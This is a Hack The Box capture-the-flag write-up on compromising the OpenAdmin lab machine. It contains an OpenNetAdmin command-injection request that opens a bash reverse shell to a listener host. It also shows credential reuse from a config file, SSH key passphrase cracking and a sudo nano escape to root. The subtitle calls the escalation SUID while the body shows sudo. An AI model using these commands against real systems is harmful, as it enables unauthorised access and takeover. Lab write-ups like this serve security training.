---
layout: page
title: OpenAdmin - Hack The Box Writeup
subtitle: Exploit OpenNetAdmin RCE (CVE-2019-26057), pivot using local service credentials, and escalate privileges via SUID Nano.
permalink: /ctf/writeups/hackthebox/openadmin/
platform: HackTheBox
machine_name: OpenAdmin
difficulty: Easy
os: Linux
date: 2026-06-26
---

## 🖥️ Machine Information
* **IP Address**: `10.10.10.171`
* **OS**: Linux (Ubuntu 18.04)
* **Difficulty**: Easy
* **Vulnerability Focus**: Command Injection / Local Port Forward / SUID Privilege Escalation

---

## 🔍 Enumeration & Reconnaissance

We begin with an Nmap service scan to discover open ports:
```bash
nmap -sC -sV -T4 -p- -oN openadmin.nmap 10.10.10.171
# Open: 22/SSH, 80/Apache 2.4.29
```

Navigating to port 80 shows a default Apache welcome page. We run directory brute-forcing to find hidden directories:
```bash
gobuster dir -u http://10.10.10.171 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
# Found: /ona/ -> OpenNetAdmin v18.1.1
```

---

## 🚀 Initial Foothold (CVE-2019-26057)

The `/ona/` directory hosts **OpenNetAdmin v18.1.1**, which is vulnerable to command injection in its `xajax` parameters:
```bash
curl -s -X POST "http://10.10.10.171/ona/" \
  --data 'xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;bash+-c+"bash+-i+>%26+/dev/tcp/10.10.14.5/4444+0>%261"&xajaxargs[]=ping'
```

We catch the reverse shell on our listener to get a session as `www-data`.

---

## 🔑 Lateral Movement

Reviewing the configurations of OpenNetAdmin, we find database credentials containing a password:
```bash
cat /opt/ona/www/local/config/database_settings.inc.php
# 'db_passwd' => 'n1nj4W4rri0R!'
```

We try this password on local users listed in `/etc/passwd`. The password works for the user `jimmy`:
```bash
su jimmy
# Password: n1nj4W4rri0R!
```

Checking internal listening ports, we discover a web service running locally on port `52846`:
```bash
netstat -tulnp
# 127.0.0.1:52846
```

Requesting it via curl returns the private SSH key of another user, `joanna`:
```bash
curl http://127.0.0.1:52846/main.php
```

We save the SSH private key and crack its passphrase using `john`:
```bash
ssh2john id_rsa > id_rsa.hash
john --wordlist=rockyou.txt id_rsa.hash
# Password: bloodninjas
```
We log in as `joanna` using SSH:
```bash
ssh -i id_rsa joanna@10.10.10.171
```

---

## ⚡ Privilege Escalation

Running `sudo -l` shows that `joanna` can run `/bin/nano` on a specific file as root without a password:
```bash
sudo -l
# (ALL) NOPASSWD: /bin/nano /opt/priv
```

We execute nano as root:
```bash
sudo /bin/nano /opt/priv
```

Inside the Nano editor, we trigger a shell escape sequence:
1. Press `Ctrl + R` (Read File)
2. Press `Ctrl + X` (Execute Command)
3. Type: `reset; sh 1>&0 2>&0`
4. Press Enter.

We are instantly returned a root shell!
```bash
id
# uid=0(root) gid=0(root)
```
